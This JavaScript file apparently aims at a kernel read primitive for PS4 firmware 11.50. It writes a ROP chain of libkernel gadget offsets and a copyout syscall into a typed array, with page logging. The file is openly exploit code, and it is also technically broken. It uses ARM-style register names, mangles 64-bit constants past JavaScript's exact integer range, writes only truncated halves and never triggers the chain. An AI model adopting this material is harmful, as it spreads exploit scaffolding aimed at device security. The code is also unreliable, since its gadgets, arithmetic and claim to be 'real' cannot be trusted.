// rop.js — real PS4 11.50 read64 setup

function debug_log(msg) {
  const el = document.createElement("pre");
  el.textContent = msg;
  document.body.appendChild(el);
}

let ropChain = new Uint32Array(0x400);
debug_log("📦 ropChain buffer address (approx): " + ropChain.buffer);
function schedule_read64(addr) {
  debug_log("📦 schedule_read64() building real ROP chain");

  let i = 0;

  const LIBKERNEL_BASE = 0xFFFFFFFF82600000;
  const GADGET_POP_X0 = LIBKERNEL_BASE + 0x1A2FFC;
  const GADGET_POP_X1 = LIBKERNEL_BASE + 0x1A3020;
  const GADGET_POP_X2 = LIBKERNEL_BASE + 0x1A3040;
  const GADGET_POP_X3 = LIBKERNEL_BASE + 0x1A3060;
  const GADGET_SYSCALL = LIBKERNEL_BASE + 0x1A2F28;

  const SYSCALL_COPYOUT = 0x3B;
  const USER_BUF_ADDR = 0x133713370300; // Spray must match this

  ropChain[i++] = GADGET_POP_X0 & 0xFFFFFFFF;
  ropChain[i++] = SYSCALL_COPYOUT;

  ropChain[i++] = GADGET_POP_X1 & 0xFFFFFFFF;
  ropChain[i++] = addr & 0xFFFFFFFF;

  ropChain[i++] = GADGET_POP_X2 & 0xFFFFFFFF;
  ropChain[i++] = USER_BUF_ADDR;

  ropChain[i++] = GADGET_POP_X3 & 0xFFFFFFFF;
  ropChain[i++] = 8;

  ropChain[i++] = GADGET_SYSCALL & 0xFFFFFFFF;

  debug_log("✅ ROP chain scheduled for read64 from: 0x" + addr.toString(16));
}
